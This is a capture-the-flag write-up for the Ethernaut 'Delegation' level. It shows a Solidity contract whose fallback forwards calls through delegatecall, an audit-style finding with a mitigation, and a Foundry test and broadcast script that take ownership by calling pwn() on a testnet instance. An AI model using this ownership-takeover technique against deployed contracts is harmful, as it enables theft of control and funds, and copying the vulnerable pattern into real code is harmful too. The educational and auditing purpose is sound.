# Level 6: Delegation

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)

**Description**:

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

`Description after completing the level`:

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.


**Code**

Code to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
  address public owner;

    constructor(address _owner) {
      owner = _owner;
    }

    function pwn() public {
      owner = msg.sender;
    }
}

contract Delegation {
  address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
      delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
      (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
          this;
        }
    }
}
```

</details>

# Findings

### [H-1] Dangerous delegatecall allows anyone to claim ownership

**Description**: The `delegatecall` allows to call a function from another contract using the storage of your current contract. In this case, the `Delegation::fallback` is calling a `delegatecall` to `Delegate::pwn` which will execute the `owner = msg.sender;` but using the `Delegation::fallback` storage that also have a `owner`. 

Because of that, if we simply make a contract `.call` passing the `Delegate::pwn` function as `msg.data` parameter, we are able to execute the `delegatecall` that will execute the `Delegate::pwn` function and update the `Delegation::owner` to whoever called the `fallback`.

```javascript
  fallback() external {
@>  (bool result,) = address(delegate).delegatecall(msg.data);
      if (result) {
        this;
      }
  }
```

**Impact**: Anyone can claim the `Delegation` ownership.

**Proof of Code**:

Code snippet from `DelegationAttack.t.sol`:

```javascript
function testShouldClaimOwnership() public{
  address attacker = makeAddr("attacker");
  vm.deal(attacker, 1 ether);

  // Ownership before
  assertEq(delegation.owner(), address(this));

  // Attack
  vm.prank(attacker);
  (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
  
  assertTrue(success);
  
  // Ownership after
  assertEq(delegation.owner(), attacker);
}
```

**Recommended Mitigation**: It is recommended to avoid using `delegatecall` for these kind of functionalities. A good recommendation is to build for `Delegation` contract it's own `transferOwnership` function, taking all precautions when developing it, of course.

# Attack

**Description**: To exploit this vulnerability, we can just make a `.call` to the `Delegation` sending the `"pwn"` function call encoded (`make attack`):

```javascript
  // DelegationAttack.s.sol

  vm.startBroadcast(attackerPK);

  // Attack
  (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
  if(!success) revert();

  vm.stopBroadcast();

```

And then execute `make submit` to submit the level instance to Ethernaut contract.

**Instance used**: [0x0f43E30428e74A96488110F493A8FD3C903a6652](https://sepolia.etherscan.io/address/0x0f43E30428e74A96488110F493A8FD3C903a6652)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xd912b53f931413feffe385f6da4724bc7b86a89d2c3c13c4998a4f6387a3b22f)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xcd583eacd2fb35d4c067497ca4c830d73e2e062b48f439d2196284b79c08e081)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```